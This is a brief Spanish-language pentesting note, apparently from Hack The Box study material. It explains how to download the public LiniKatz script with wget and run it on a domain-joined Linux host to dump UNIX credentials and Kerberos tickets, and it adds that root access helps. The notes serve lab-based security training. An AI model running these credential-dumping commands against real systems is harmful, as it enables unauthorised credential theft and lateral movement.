## LiniKatz
Cuando tenemos acceso a una maquina linux unida a un dominio, podemos ejecutar linikatz para tratar de exportar la mayoria de credenciales UNIX posibles, asi como tickets etc. Al lanzarlo se creará una carpeta `linikatz.<algo>` y se volcará ahi todo.
> Para mayor efectividad, debemos ser root


https://github.com/CiscoCXSecurity/linikatz
```
glmbx@htb[/htb]$ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
glmbx@htb[/htb]$ /opt/linikatz.sh
```
